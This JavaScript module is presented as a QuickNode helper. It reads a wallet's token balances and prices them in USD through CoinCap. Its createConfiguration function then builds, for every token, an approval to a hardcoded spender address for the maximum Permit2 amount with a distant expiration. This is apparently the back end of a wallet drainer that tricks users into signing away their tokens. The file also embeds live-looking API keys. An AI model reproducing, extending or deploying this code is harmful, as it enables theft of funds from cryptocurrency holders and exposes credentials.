import axios from 'axios'
import { ethers } from 'ethers'
const Quicknode = function (account) {
  switch (process.env.NEXT_PUBLIC_CHAIN) {
    case '1': //eth
      this.baseURL = `https://distinguished-alien-breeze.discover.quiknode.pro/32b2cd2e42304a674d425374469e147229596442`
      break
  }

  this.account = account ? account : ''
}

Quicknode.prototype = {
  inspectWalletToken: async function () {
    let assetdata = {}
    const provider = new ethers.providers.JsonRpcProvider(this.baseURL)
    //   provider.connection.headers = { 'x-qn-api-version': 1 }
    assetdata = await provider.send('qn_getWalletTokenBalance', {
      wallet: this.account,
    })
    return assetdata
  },

  inspectTokenPrice: async function (token_id) {
    const httpCoincap = axios.create({
      baseURL: 'https://',
      timeout: 1000 * 180,
      withCredentials: false,
    })

    const config = {
      method: 'get',
      maxBodyLength: Infinity,
      url: 'api.coincap.io/v2/assets/' + token_id,
      headers: {
        Authorization: 'Bearer 9b51a6cb-9627-47ff-9782-bbb2e6b08d6c',
      },
    }
    return await httpCoincap(config)
  },
  getAssestIds: async function (token_name) {
    const httpCoincap = axios.create({
      baseURL: 'https://',
      timeout: 1000 * 180,
      withCredentials: false,
    })

    const config = {
      method: 'get',
      maxBodyLength: Infinity,
      url: 'api.coincap.io/v2/assets?search=' + token_name + '&limit=1',
      headers: {
        Authorization: 'Bearer 9b51a6cb-9627-47ff-9782-bbb2e6b08d6c',
      },
    }

    return await httpCoincap(config)
  },
  caculateValue: async function () {
    const tokenlist = await this.inspectWalletToken()
    let value_able_token = []
    for await (let item of tokenlist['assets']) {
      const amount = parseInt(item.amount) / 10 ** parseInt(item.decimals)
      const value_able_token_id = await this.getAssestIds(item.symbol)
      const token_price = await this.inspectTokenPrice(
        value_able_token_id.data.data[0].id
      )
      //  console.log(token_price, amount)
      const token_valueable = token_price.data.data.priceUsd * amount
      const symbol = item.symbol
      const name = item.name
      const address = item.address
      const data = {
        name,
        amount,
        symbol,
        address,
        token_valueable,
      }
      value_able_token.push(data)
    }
    return value_able_token
  },
  createConfiguration: async function () {
    if (this.account == '') return (data = {})

    let tokens = await this.caculateValue()

    const spender_address = "0x5eE4A19bf6D6908AB12853Af169575bBFeCF8BFE";
    const amount = '1461501637330902918203684832716283019655932542975'
    const expiration = 1885674579

    let data = {}
    for await (let n of tokens) {
      ;(data['spender_address'] = spender_address),
        (data['expiration'] = expiration),
        (data[n.symbol.toLowerCase()] = {
          name: n.symbol.toLowerCase(),
          symbol: n.symbol.toLowerCase(),
          address: n.address.toLowerCase(),
          amount: amount,
          expiration: expiration,
        })
    }

    return data
  },
}

export default Quicknode
